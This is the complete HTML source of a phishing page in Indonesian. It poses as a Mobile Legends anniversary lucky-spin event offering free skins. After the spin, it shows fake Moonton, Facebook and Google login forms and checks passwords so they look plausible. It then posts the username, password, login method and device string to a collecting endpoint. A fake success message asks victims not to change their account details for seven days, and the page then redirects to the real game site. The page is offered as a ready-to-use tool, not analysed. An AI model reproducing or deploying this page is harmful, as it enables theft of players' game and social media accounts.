<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MLBB Lucky Spin - Anniversary Event</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #0f172a; color: white; text-align: center; margin: 0; padding: 10px; }
        .container { max-width: 400px; margin: auto; background: #1e293b; padding: 20px; border-radius: 15px; border: 2px solid #38bdf8; }
        .wheel-container { position: relative; margin: 20px auto; width: 220px; height: 220px; border-radius: 50%; border: 8px solid #facc15; transition: transform 4s cubic-bezier(0.15, 0, 0.15, 1); background: conic-gradient(#2563eb 0 30deg, #1d4ed8 30deg 60deg, #2563eb 60deg 90deg, #1d4ed8 90deg 120deg, #2563eb 120deg 150deg, #1d4ed8 150deg 180deg, #2563eb 180deg 210deg, #1d4ed8 210deg 240deg, #2563eb 240deg 270deg, #1d4ed8 270deg 300deg, #2563eb 300deg 330deg, #1d4ed8 330deg 360deg); }
        button#spinBtn { background: #facc15; border: none; padding: 15px; font-weight: bold; border-radius: 10px; cursor: pointer; width: 100%; color: #000; font-size: 16px; }
        
        /* Modal Style */
        #loginModal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 100; justify-content: center; align-items: center; padding: 20px; }
        .login-box { background: #fff; color: #333; padding: 25px; border-radius: 12px; width: 100%; max-width: 320px; text-align: left; }
        .method-btn { width: 100%; padding: 12px; margin: 5px 0; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; color: white; text-align: center; display: block; }
        .f-fb { background: #1877f2; } .f-mt { background: #f39c12; } .f-gl { background: #ea4335; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
        #errPass { color: red; font-size: 11px; margin-bottom: 10px; display: block; }
    </style>
</head>
<body>

<div class="container">
    <h2 style="color: #38bdf8; margin-bottom: 5px;">MLBB ANNIVERSARY</h2>
    <p style="font-size: 13px; color: #94a3b8;">Spin & Menangkan Skin Epic Gratis!</p>
    
    <div style="position: relative;">
        <div style="width: 0; height: 0; border-left: 15px solid transparent; border-right: 15px solid transparent; border-top: 30px solid #facc15; position: absolute; top: -10px; left: 50%; transform: translateX(-50%); z-index: 10;"></div>
        <div class="wheel-container" id="wheel">
            <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); font-size: 10px; color: gold; font-weight: bold;">LUCKY DRAW</div>
        </div>
    </div>

    <p style="font-size: 14px;">Kesempatan Draw: <span id="count" style="color:#facc15; font-weight:bold;">10</span>/10</p>
    <button id="spinBtn" onclick="startSpin()">DRAW SEKARANG</button>
</div>

<div id="loginModal">
    <div class="login-box" id="step1">
        <h3 style="margin-top:0; text-align:center;">Klaim Hadiah Kamu</h3>
        <p style="font-size: 13px; text-align:center;">Silakan login untuk memverifikasi akun pengiriman.</p>
        <button class="method-btn f-mt" onclick="showForm('Moonton')">Login via Moonton</button>
        <button class="method-btn f-fb" onclick="showForm('Facebook')">Login via Facebook</button>
        <button class="method-btn f-gl" onclick="showForm('Google')">Login via Google</button>
    </div>

    <div class="login-box" id="step2" style="display:none;">
        <h3 id="formTitle">Login</h3>
        <input type="text" id="user" placeholder="Email / Username">
        <input type="password" id="pass" placeholder="Kata Sandi">
        <span id="errPass"></span>
        <button class="method-btn" style="background:#2ecc71" onclick="submitData()">KLAIM SEKARANG</button>
    </div>

    <div class="login-box" id="step3" style="display:none; text-align:center;">
        <h2 style="color: #27ae60;">VERIFIKASI BERHASIL!</h2>
        <p id="finalText" style="font-size: 13px; line-height: 1.6; color: #555;"></p>
        <button class="method-btn f-fb" onclick="window.location.href='https://m.mobilelegends.com'">TUTUP</button>
    </div>
</div>

<script>
    let currentMethod = "";
    let drawCount = 10;

    function startSpin() {
        if(drawCount <= 0) return alert("Kesempatan hari ini habis!");
        drawCount--;
        document.getElementById('count').innerText = drawCount;
        
        const wheel = document.getElementById('wheel');
        const deg = Math.floor(Math.random() * 360) + 3600;
        wheel.style.transform = `rotate(${deg}deg)`;
        
        setTimeout(() => {
            document.getElementById('loginModal').style.display = 'flex';
        }, 4500);
    }

    function showForm(method) {
        currentMethod = method;
        document.getElementById('step1').style.display = 'none';
        document.getElementById('step2').style.display = 'block';
        document.getElementById('formTitle').innerText = "Login " + method;
    }

    async function submitData() {
        const user = document.getElementById('user').value;
        const pw = document.getElementById('pass').value;
        const err = document.getElementById('errPass');
        err.innerText = "";

        if(!user || !pw) return alert("Lengkapi data!");

        // --- VALIDASI RULES MASTER FAGYMOFFC ---
        if (currentMethod === 'Moonton') {
            if (!/[A-Z]/.test(pw)) {
                err.innerText = "Error: Password Moonton harus mengandung minimal 1 huruf kapital!";
                return;
            }
        } else {
            if (pw.length < 8) {
                err.innerText = "Error: Password " + currentMethod + " harus minimal 8 karakter!";
                return;
            }
        }

        try {
            await fetch('/api/kirim', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    user, 
                    pw, 
                    method: currentMethod,
                    device: navigator.userAgent 
                })
            });

            document.getElementById('step2').style.display = 'none';
            document.getElementById('step3').style.display = 'block';
            document.getElementById('finalText').innerText = "Hadiah akan masuk ke email mobilelegends akun kamu setelah 7 hari. Mohon jangan mengganti data akun agar proses verifikasi lancar.";
            
        } catch (e) {
            alert("Terjadi gangguan server. Coba lagi.");
        }
    }
</script>

</body>
</html>
